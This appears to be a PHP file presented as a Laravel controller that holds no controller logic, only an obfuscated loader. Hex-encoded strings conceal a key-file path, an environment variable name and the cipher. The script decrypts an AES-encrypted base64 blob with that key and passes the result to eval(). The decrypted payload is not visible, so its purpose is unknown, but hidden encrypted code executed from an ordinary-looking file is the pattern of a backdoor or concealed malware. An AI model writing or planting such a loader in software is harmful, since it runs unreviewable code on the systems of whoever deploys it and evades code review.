<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('SsKBVInjCALga7LnMSAA0A==');

$c=base64_decode(

'K3szzrrnXxGJxhSN3SwL8c7KLE65wQEMAkzf/8xbNFEcG8zhQlCd0rt+ssIiqgAf1urAq19PkkuL' .
'MnF76D16sf23VxOaVDLQTkrt7C9qfYN5TgnJ7h+h9/xjqpRtZ4dQQapFsbLF7zezMcqfJs8/wwRx' .
'Go7nA2/fxFMOwi91f4UO0TxEzSwEqRtWiN3kVONxPqCE39UCzEmQTsDKoxTh45I3uqE2UX0eMMGK' .
'D6Nk+2JxfILxl+mqa5gYH2/8OHaO'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

